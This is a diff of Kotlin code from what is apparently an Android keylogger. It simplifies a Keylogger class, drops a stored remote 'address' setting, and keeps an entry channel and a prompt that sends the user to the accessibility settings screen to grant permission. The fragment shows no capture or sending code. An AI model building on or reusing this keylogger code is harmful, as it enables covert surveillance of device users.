@@ -24,25 +24,14 @@ import kotlinx.coroutines.channels.Channel
 ............\..............(
 ..............\.............\...
 */
-class Keylogger{
-    companion object Config{
-/*        val httpClient = HttpClient(Android) {
-            install(JsonFeature){ serializer = JacksonSerializer() }
-        }*/
-        val KEY = "address"
+object Keylogger{
+    val channel = Channel<KeyloggerEntry>()
 
-        val channel = Channel<KeyloggerEntry>()
-
-        fun Context.initKeylogger(addr: String) = PreferenceManager.getDefaultSharedPreferences(this).edit().apply { this.putString(KEY, addr) }.apply()
-
-        fun Context.address() = PreferenceManager.getDefaultSharedPreferences(this).getString(KEY, "")
-
-        fun requestPermission(ctx: Context){
-            val intent = Intent().apply{
-                action = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            }
-            ctx.startActivity(intent)
+    fun requestPermission(ctx: Context){
+        val intent = Intent().apply{
+            action = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
         }
+        ctx.startActivity(intent)
     }
 }
